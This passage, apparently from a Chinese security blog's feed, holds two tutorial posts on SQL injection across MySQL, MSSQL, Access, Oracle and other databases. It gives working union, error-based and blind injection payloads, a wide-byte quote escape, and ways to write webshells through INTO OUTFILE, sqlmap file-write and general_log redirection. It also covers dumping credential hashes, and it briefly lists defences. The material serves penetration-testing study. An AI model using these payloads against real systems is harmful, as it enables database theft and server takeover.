魔术引号及常见保护</h2><p>php.ini中存在<strong>magic_quotes_gpc</strong>选项，称为魔术引号，此选项打开，使用<code>GET，POST，cookie</code>所接收的<code>'</code>单引号，<code>&quot;</code>双引号，<code>\</code>反斜线和<code>NULL字符</code>全部被加上一个反斜线转义。此时，注入类型是字符型注入已经无法构成威胁。</p><ol><li>编码或宽字节绕过<ol><li>isset无法绕过，则替换关键字</li><li>宽字节绕过<code>0XBF27</code>是两个字符，在PHP中比如<code>addslash</code>和<code>magic_quotes_gpc</code>开启时，由于会对<code>0x27</code>单引号进行转义，因此<code>0xbf27</code>会变成<code>0xbf5c27</code>，而数据进入数据库中时，由于<code>0XBF5C</code>是一个另外的字符，因此<code>\</code>转义符号会被前面的<code>bf</code>带着&quot;<strong>吃掉</strong>&quot;，单引号由此逃逸出来可以用来闭合语句</li></ol></li><li>自定义关键字替换</li></ol><p>其他绕过思路见其他文章</p><h2 id="权限获取"><a class="markdownIt-Anchor" href="#权限获取"></a> 权限获取</h2><h3 id="数据库操作权限获取"><a class="markdownIt-Anchor" href="#数据库操作权限获取"></a> 数据库操作权限获取</h3><p>提权之前需要获得高权限用户，获得高权限Mysql用户可以通过以下方法：</p><ol><li><p>弱口令爆破</p></li><li><p>sqlmap注入的<code>--sql-shell</code>模式</p><p>进入交互界面后，通过<code>select host,user,password from mysql.user</code>这条命令，可以查询数据库的用户和密码。</p></li><li><p>网站的数据库配置文件中拿到明文密码信息。文件名一般都有<code>config</code></p></li><li><p>CVE-2012-2122 等这类漏洞直接拿下 MySQL 权限</p></li></ol><h3 id="webshell获取"><a class="markdownIt-Anchor" href="#webshell获取"></a> Webshell获取</h3><h4 id="into-outfile"><a class="markdownIt-Anchor" href="#into-outfile"></a> into outfile</h4><ul><li><p>知道网站物理路径</p></li><li><p>高权限数据库用户</p></li><li><p><code>load_file()</code>开启 即 <code>secure_file_priv </code>无限制</p><p>可以通过这个查：<code>mysql&gt; show global variables like '%secure_file_priv%';</code></p><table><thead><tr><th>值</th><th>说明</th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>/tmp</td><td>只允许在/tmp操作</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote></li><li><p>网站路径有写入权限</p></li></ul><p><strong>操作</strong></p><ol><li><pre class="hljs"><code class="bash"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/info.php&#x27;</span>;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   sqlmap -u &quot;http://x.x.x.x/?id=x&quot; --file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot;</span><br></pre></td></tr></table></figure></code></pre></li></ol><h4 id="日志文件写-shell"><a class="markdownIt-Anchor" href="#日志文件写-shell"></a> 日志文件写 shell</h4><ul><li>Web 文件夹宽松权限可以写入</li><li>Windows 系统下</li><li>高权限运行 MySQL 或者 Apache</li></ul><p><strong>日志设置查看</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">general_log</span><br><span class="line">general_log_file</span><br><span class="line"># 自定义</span><br><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&#x27;/var/www/html/info.php&#x27;;</span><br><span class="line"># 往日志里面写入 payload</span><br><span class="line">select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：</p></blockquote><p>注：</p><ol><li>这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：</li><li>Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些</li></ol><h2 id="系统命令执行提权参考国光"><a class="markdownIt-Anchor" href="#系统命令执行提权参考国光"></a> 系统命令执行（提权【参考<a href="https://www.sqlsec.com/2020/11/mysql.html#MSF-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83">国光</a>】）</h2><h3 id="查询hash解密"><a class="markdownIt-Anchor" href="#查询hash解密"></a> 查询HASH解密</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># MySQL &lt;= 5.6 版本</span><br><span class="line">mysql&gt; select host, user, password from mysql.user;</span><br><span class="line"># MySQL &gt;= 5.7 版本</span><br><span class="line">mysql &gt; select host,user,authentication_string from mysql.user;</span><br></pre></td></tr></table></figure><blockquote><p>也可以通过 Hashcat 来手动跑字典，基本上使用 GPU 破解的话也是可以秒破解的：</p></blockquote><h3 id="udf提权"><a class="markdownIt-Anchor" href="#udf提权"></a> UDF提权</h3><h3 id="反弹端口提权"><a class="markdownIt-Anchor" href="#反弹端口提权"></a> 反弹端口提权</h3><h3 id="mof提权"><a class="markdownIt-Anchor" href="#mof提权"></a> MOF提权</h3><h3 id="启动项提权"><a class="markdownIt-Anchor" href="#启动项提权"></a> 启动项提权</h3><h3 id="cve-2016-66636664组合拳"><a class="markdownIt-Anchor" href="#cve-2016-66636664组合拳"></a> CVE-2016-6663/6664组合拳</h3><h2 id="低版本注入配合读取或暴力-小于50版本"><a class="markdownIt-Anchor" href="#低版本注入配合读取或暴力-小于50版本"></a> 低版本注入配合读取或暴力 小于5.0版本</h2><p>字典或读取，爆破</p><h1 id="access"><a class="markdownIt-Anchor" href="#access"></a> ACCESS</h1><p>access数据库保存在网站源码下面，自己网站数据库独立存在，没有文件读写的操作。</p><p>面对它只能暴力猜解，没有其他办法。</p><ul><li><strong>Access注入时，如果列名或者表名猜解不到的情况怎么办？</strong><ul><li>Access偏移注入：解决列名获取不到的情况。</li></ul></li></ul><ol><li><p>and 1=2 报错找到注入点</p></li><li><p>order by 获取总字段</p></li><li><p>猜解表名 and exists (select * from admin) 页面返回正常，说明存在admin表</p></li><li><p>猜解列名 and exists(select id from admin) 页面显示正常，admin表中存在id列 username,passwd 同样存在</p></li><li><p>脱库 union select 1,username,passwd,4 from admin</p></li></ol><h1 id="mssql"><a class="markdownIt-Anchor" href="#mssql"></a> MSSQL</h1><ol><li><p>and 1=2报错</p></li><li><p>order by N# 获取总字段</p></li><li><p>猜表名 and exists(select * from manage) 表名manage存在</p></li><li><p>猜解列名<code>and exists(select id from manage)</code>列名id存在</p></li><li><p>脱库<code>and exists (select id from manage where id=1 )</code>证明id=1存在</p><p>and exists (select id from manage where%20 len(username)=8 and id=1 ) 猜解username字段长度为8</p><p>and exists (select id from manage where%20 len(password)=16 and id=1 ) 猜解password字段长度为16</p><p>可用Burp的Intruder功能辅助猜解</p><p>猜解username第1到8位的字符，ASCII转码 admin_mz</p><p>猜解password第1到16位的字符，ASCII转码(Burp 爆破)</p><p>转ASCII的py脚本：</p><p>72e1bfc3f01b7583 MD5解密为97285101</p></li></ol><h2 id="常用参数"><a class="markdownIt-Anchor" href="#常用参数"></a> 常用参数</h2><ol><li><code>@@version</code>，查询当前数据库版本</li><li><code>db_name()</code>，查询当前数据库名称</li><li><code>user,system_user,current_user,user_name</code>，查询当前用户</li><li><code>IS_SRVROLEMEMBER()</code>，查询数据库权限。</li><li><code>@@SERVERNAME</code>：获取有关服务器主机的信息</li></ol><h1 id="sqlite"><a class="markdownIt-Anchor" href="#sqlite"></a> SQLite</h1><ol><li><p>找注入点 and 1=1</p></li><li><p>order by N 猜字段 4</p></li><li><p>猜数据库</p><p>offset ==&gt;0~2</p><p>有三个数据库：</p><p>WSTMart_reg</p><p>notice_sybase</p><p>sqlite_sequence</p></li><li><p>猜列</p><p>共有3个字段：</p><p>id,name,password</p></li><li><p>脱库</p></li></ol><h1 id="mongodb"><a class="markdownIt-Anchor" href="#mongodb"></a> MongoDB</h1><ol><li><p>id=1′ 单引号注入报错</p></li><li><p>闭合语句，查看所有集合</p></li><li><p>查看指定集合的数据</p></li></ol><p>[0] 代表第一条数据，可递增</p><h1 id="db2"><a class="markdownIt-Anchor" href="#db2"></a> DB2</h1><ol><li><p>and 1=2 判断注入点</p></li><li><p>order by N 获取字段数</p></li><li><p>爆当前数据库：GAME_CHARACTER</p></li><li><p>列表：NAME</p></li><li><p>脱库</p></li></ol><h1 id="postgresql"><a class="markdownIt-Anchor" href="#postgresql"></a> PostgreSQL</h1><ol><li><p>and 1=2 判断注入点</p></li><li><p>order by N 获取字段</p></li><li><p>爆数据库</p></li><li><p>列表</p></li><li><p>列字段</p></li><li><p>脱库</p></li></ol><h1 id="sybase数据库"><a class="markdownIt-Anchor" href="#sybase数据库"></a> Sybase数据库</h1><ol><li><p>and 1=2 判断注入点</p></li><li><p>order by N 获取总字段</p></li><li><p>爆数据库</p></li><li><p>列表</p></li><li><p>列字段</p></li><li><p>查状态：结果为：zhang</p></li><li><p>反选爆用户名：结果为：mozhe</p></li><li><p>猜解密码</p></li></ol><h1 id="oracle"><a class="markdownIt-Anchor" href="#oracle"></a> Oracle</h1><ol><li><p>and 1=1</p></li><li><p>order by</p></li><li><p>爆数据库</p></li><li><p>列表</p></li><li><p>列字段</p></li><li><p>脱库</p></li></ol><p>加上状态：<code>1 where STATUS=1</code></p><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="小tips"><a class="markdownIt-Anchor" href="#小tips"></a> 小tips</h2><h3 id="outfile-和-dumpfile的区别"><a class="markdownIt-Anchor" href="#outfile-和-dumpfile的区别"></a> outfile 和 dumpfile的区别</h3><p><strong>outfile:</strong></p><ol><li>支持多行数据同时导出</li><li>使用union联合查询时，要保证两侧查询的列数相同</li><li>会在换行符制表符后面追加反斜杠</li><li>会在末尾追加换行</li></ol><p><strong>dumpfile:</strong></p><ol><li>每次只能导出一行数据</li><li>不会在换行符制表符后面追加反斜杠</li><li>不会在末尾追加换行</li></ol><p>因此，我们可以使用<code>into dumpfile</code>这个函数来顺利写入二进制文件；<code>into outfile</code>函数也可以写入二进制文件，只是追加的反斜杠会使二进制文件无法生效。如果服务器端本身的查询语句，结果有多行，但是我们又想使用<code>dump file</code>，应该手动添加 <code>limit</code> 限制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#介绍&quot;&gt;&lt;/a&gt; 介绍&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;什么决定网站注入点用户权限？&lt;strong&gt;数据库配置文件&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;常用数据库&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="sql注入" scheme="https://j3f5.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入基础</title>
    <link href="https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/05/23/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</id>
    <published>2023-05-23T02:29:45.000Z</published>
    <updated>2023-05-25T01:14:36.391Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入基础"><a class="markdownIt-Anchor" href="#sql注入基础"></a> SQL注入基础</h1><img src="/images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/2265061-20210114103534539-1238016327-16848464764182.png" alt="img" style="zoom:80%;" /><h2 id="基础语法以及函数"><a class="markdownIt-Anchor" href="#基础语法以及函数"></a> 基础语法以及函数</h2><h3 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查询</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line"># 更新</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> pwd<span class="operator">=</span>’$p’ <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> username<span class="operator">=</span>‘admin’</span><br><span class="line"># 添加</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users(id,url,text) <span class="keyword">values</span>(<span class="number">2</span>,‘x’,’$t’)</span><br><span class="line"># 删除</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line"># <span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> id,name,price <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">order</span></span><br></pre></td></tr></table></figure><p>其他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 增加字段</span><br><span class="line">ALTER TABLE employees ADD phone varchar(20)</span><br><span class="line"># 权限控制(grant revoke)</span><br><span class="line">grant insert on grant_rights to unauthorized_user</span><br><span class="line"># 删表</span><br><span class="line">DROP TABLE users;</span><br></pre></td></tr></table></figure><h3 id="连接词-联合查询"><a class="markdownIt-Anchor" href="#连接词-联合查询"></a> 连接词、联合查询</h3><p>**union：**联合查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>join</strong>：连接查询（right/left join），如下搜索两个表相同的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">where</span> a.id <span class="operator">=</span> b.id</span><br></pre></td></tr></table></figure><h3 id="注释以及其他符号"><a class="markdownIt-Anchor" href="#注释以及其他符号"></a> 注释以及其他符号</h3><p><strong>注释：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* */</span>          <span class="keyword">are</span> inline comments</span><br><span class="line"><span class="comment">-- , #          are line comments</span></span><br><span class="line"></span><br><span class="line">Example: <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="comment">-- AND pass = &#x27;pass&#x27;</span></span><br></pre></td></tr></table></figure><p>对于<code>#</code></p><ol><li>url中的#是用来指导浏览器动作的（例如锚点），对服务端完全无用</li><li>所以在URL中使用#进行注入时应该将它转成url编码：<code>%23</code></li><li>在POST请求中就不需要（需要验证）</li></ol><p>对于<code>--(空格)</code></p><ol><li>一般在GET请求中，空格会直接被忽略，所以需要把他转化成<code>--%20</code></li><li>还有另外一种方式，就是使用<code>--+</code>，这时候+号会被解释成空格</li><li>为什么要加空格：因为这样可以和后面的单引号隔开，才能形成有效的payload</li></ol><p>对于需要编码转码的<code>#</code>有用，因为只有一个字符，POST最好用这个，其他用<code>--+</code></p><p><strong>堆叠查询：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;        allows query chaining</span><br><span class="line"></span><br><span class="line">Example: <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users; <span class="keyword">DROP</span> <span class="keyword">TABLE</span> users;</span><br></pre></td></tr></table></figure><p><strong>查询可用：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;,+,||         allows string concatenation</span></span><br><span class="line"><span class="string">Char()         strings without quotes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example: SELECT * FROM users WHERE name = &#x27;</span><span class="operator">+</span><span class="type">char</span>(<span class="number">27</span>) <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="注入原理以及危害"><a class="markdownIt-Anchor" href="#注入原理以及危害"></a> 注入原理以及危害</h2><p>对于传入的搜索内容<strong>过滤不严</strong>，导致用户可以通过拼接SQL语句，对数据库进行操作。</p><p>以下情形均可能产生漏洞：</p><ol><li>接收数据</li><li>拼接数据</li><li>数据库执行</li><li>结果展示</li></ol><p>他会导致如下危害：</p><ol><li><p>危害数据库里的<strong>数据</strong></p></li><li><p>直接危害网站的<strong>权限</strong></p></li></ol><p>我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用<strong>猜测</strong>到对方的 <strong>SQL 查询方式</strong></p><h1 id="基本注入"><a class="markdownIt-Anchor" href="#基本注入"></a> 基本注入</h1><p><strong>这里以mysql注入为例子</strong></p><img src="/images/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20230523110144810-16848464848533.png" alt="image-20230523110144810" style="zoom:80%;" /><h2 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h2><p>主要搜集：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 操作系统</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version_compile_os</span></span><br><span class="line"># 数据库版本：</span><br><span class="line"><span class="keyword">select</span> version()</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span></span><br><span class="line"># 数据库名字：</span><br><span class="line"><span class="keyword">select</span> database()</span><br><span class="line"># 数据库用户：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>()</span><br></pre></td></tr></table></figure><p>在mysql的5.0以上版本中，自带一个information_schema数据库名，存储数据库所有的信息，具有表schemata（数据库名）tables（表名）columns（列名字段名）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SCHEMA_NAME字段用来存储数据库名，TABLE_SCHEMA字段用来存储表名，</span><br><span class="line">table_schema和table_name分别来存储数据库名和表名</span><br><span class="line">information_schema.tables 记录所有的表</span><br><span class="line">information_schema.columns 记录所有的列</span><br></pre></td></tr></table></figure><p>小知识点：</p><blockquote><p>问：一个@与两个@@有何区别？</p><p>答：一个@是用户自定义变量，两个@是系统变量</p></blockquote><h2 id="手工注入"><a class="markdownIt-Anchor" href="#手工注入"></a> 手工注入</h2><ol><li><p><strong>判断是否能注入，以及注入类型</strong></p><ol><li>先看<strong>是否输出信息</strong>：可以使用<code>'</code>、<code>&quot;</code> 和<code>--+</code>来测试</li><li>输出<strong>正确</strong>、<strong>错误</strong>与<strong>报错</strong>信息：都可以</li><li>输出<strong>正确</strong>、<strong>报错</strong>但不输出错误信息：布尔/时间盲注/报错注入</li><li>输出<strong>正确</strong>但不输出报错和错误信息：布尔/时间盲注</li><li><strong>不输出</strong>任何信息：时间盲注</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 或 且 非 三种逻辑判断符</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and 1=1</span></span><br></pre></td></tr></table></figure></li><li><p><strong>判断有几个注入点：</strong><code>id=1' order by 3--+</code></p></li><li><p><strong>判断输出点有几个是可以回显的</strong>：<code>id=1' union select 1,2,3 --+</code></p></li><li><p><strong>信息搜集：</strong></p><ol><li>获取数据库:<ol><li>获取此时的数据库：<code>id=-1' union select 1,2,database() --+</code></li><li>获取全部数据库：<code>id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></li></ol></li><li>获取表名:<code>id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code><ol><li>查询其他数据库表名把<code>database()</code>换成<code>'you_want'</code></li></ol></li><li>获取列名：<code>id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='you_want --+'</code></li></ol></li><li><p><strong>数据获取：</strong></p><ol><li>获取单个：<code>id=-1' union select 1,2,[columnname] from [tablename] --+'</code></li><li>获取全部：<ol><li><code>id=-1' union select 1,2,group_concat([allcolumnname]) from [tablename]--+</code></li><li><code>-1' union select 1,2,(select concat_ws([column_name]) from [tbname]) --+</code></li></ol></li></ol></li></ol><h3 id="闭合"><a class="markdownIt-Anchor" href="#闭合"></a> 闭合</h3><p><strong>常用闭合</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+ （数字型）</span></span><br><span class="line"><span class="string">&#x27; or 1=1--+ （字符型）</span></span><br><span class="line"><span class="string">&quot; or 1=1--+ （字符型）</span></span><br><span class="line"><span class="string">) or 1=1--+ （MySQL是允许嵌入多个括号的）</span></span><br><span class="line"><span class="string">&#x27;</span>) <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;)) <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><strong>非注释闭合</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|| &#x27;</span><br><span class="line">or &#x27;</span><br><span class="line">&amp;&amp; &#x27;1&#x27;=&#x27;1</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure><h2 id="报错and盲注"><a class="markdownIt-Anchor" href="#报错and盲注"></a> 报错and盲注</h2><p>盲注就是在注入过程中，获取的<strong>数据不能回显</strong>至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p><ol><li>基于布尔的 SQL 盲注-逻辑判断：<code>regexp</code>，<code>like</code>，<code>ascii</code>，<code>left</code>，<code>ord</code>，<code>mid</code></li><li>基于时间的 SQL 盲注-延时判断：<code>if</code>，<code>sleep</code></li><li>基于报错的 SQL 盲注-报错回显：<code>floor</code>，<code>updatexml</code>，<code>extractvalue</code></li></ol><p>对于报错注入，其payload可以安排在如下位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or（有效载荷）or&#x27;</span><br><span class="line">&#x27;and（有效载荷）and&#x27;</span><br><span class="line">&#x27;or（有效载荷）and&#x27;</span><br><span class="line">&#x27;or（有效载荷）and&#x27;=&#x27;</span><br><span class="line">&#x27;*（有效载荷）*&#x27;</span><br><span class="line">&#x27;or（有效载荷）and&#x27;</span><br><span class="line">“ - （有效载荷） - “</span><br></pre></td></tr></table></figure><p>参考：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">like</span> ‘ro<span class="operator">%</span>’#判断ro或ro…是否成立</span><br><span class="line">regexp ‘<span class="operator">^</span>xiaodi[<span class="number">1</span><span class="operator">-</span>z]’#匹配xiaodi及xiaodi…等</span><br><span class="line">if(条件,<span class="number">5</span>,<span class="number">0</span>)#条件成立，返回<span class="number">5</span>，反之，返回<span class="number">0</span></span><br><span class="line">sleep(<span class="number">5</span>) #<span class="keyword">SQL</span>语句延时执行<span class="number">5</span>秒</span><br><span class="line">mid(a,b,c) #从位置b开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c) #从B位置开始，截取字符串a的c长度</span><br><span class="line"><span class="keyword">left</span>(database(),<span class="number">1</span>),database() #<span class="keyword">left</span>(a,b)从左侧截取a的前b位</span><br><span class="line">length(database())<span class="operator">=</span><span class="number">8</span> #判断数据库database()名的长度</span><br><span class="line">ord<span class="operator">=</span>ascii ascii(x)<span class="operator">=</span><span class="number">97</span> #判断x的ascii码是否等于<span class="number">97</span></span><br></pre></td></tr></table></figure><p>涉及资源：</p><ol><li><p><a href="https://www.jianshu.com/p/bc35f8dd4f7c">12种报错注入+万能语句</a></p></li><li><p><a href="https://www.jianshu.com/p/fcae21926e5c">Order by排序注入方法小总结</a></p></li></ol><h3 id="insert-update"><a class="markdownIt-Anchor" href="#insert-update"></a> Insert update</h3><p>语句：<code>insert into user(username,password) values('$username','$password',)</code></p><p><strong>floor</strong>：<code>username=lwx’ or(select 1 from(select count(*),concat((select(select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or '</code></p><p><strong>updatexml</strong>：<code>username=lwx’ or updatexml(1,concat(0x7e,(version())),0) or '</code></p><p><strong>extractvalue</strong>：<code>username=lwx’ or extractvalue(1,concat(0x7e,database())) or '</code></p><h3 id="delete"><a class="markdownIt-Anchor" href="#delete"></a> delete</h3><p>在get中需要使用+号或者%20把语句连接起来，避免出错</p><p><strong>floor</strong>：<code>GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a) HTTP/1.1</code></p><p><strong>updatexml</strong>：<code>GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+updatexml+(1,concat(0x7e,database()),0) </code></p><p><strong>extractvalue</strong>：<code>GET /pikachu-master/vul/sqli/sqli_del.php?id=57+or+extractvalue(1,concat(0x7e,database())) HTTP/1.1</code></p><h2 id="布尔与延时盲注"><a class="markdownIt-Anchor" href="#布尔与延时盲注"></a> 布尔与延时盲注</h2><h3 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h3><ol><li><code>id=1' and left(version(),1)=5 --+</code></li><li><code>id=1' and length(database())=8--+</code></li></ol><h3 id="延时盲注"><a class="markdownIt-Anchor" href="#延时盲注"></a> 延时盲注</h3><ol><li><code>id=1 and if((length(database()=8)),sleep(5),1)--+</code></li><li><code>id=1 and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+</code></li></ol><h1 id="防御sql注入"><a class="markdownIt-Anchor" href="#防御sql注入"></a> 防御SQL注入</h1><p>需要分清各种防御针对的对象是谁。</p><ol><li>SQL语句的执行代码使用<strong>预编译</strong> PreparedStatement 。</li><li><strong>确定每个数据的类型</strong>，比如是数字，数据库则必须使用int类型来存储。(这个是用来防什么的？)</li><li><strong>限制传入数据的长度</strong>，这能够在一定程度上防止sql注入。</li><li>严格<strong>限制</strong>用户使用<strong>数据库的权限</strong>，能够在一定程度上减少sql注入的危害。</li><li>避免直接响应一些 sql 语句<strong>执行异常的信息</strong>。</li><li><strong>过滤</strong>参数中含有的一些数据库<strong>关键词</strong>。</li></ol><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><h2 id="基础概念"><a class="markdownIt-Anchor" href="#基础概念"></a> 基础概念</h2><ol><li>实例名：数据库实例名是用于和操作系统进行联系的标识,就是说数据库和操作系统之间的交互用的是数据库实例名</li></ol><p>待补充…</p>]]></content>
    
    
      
      
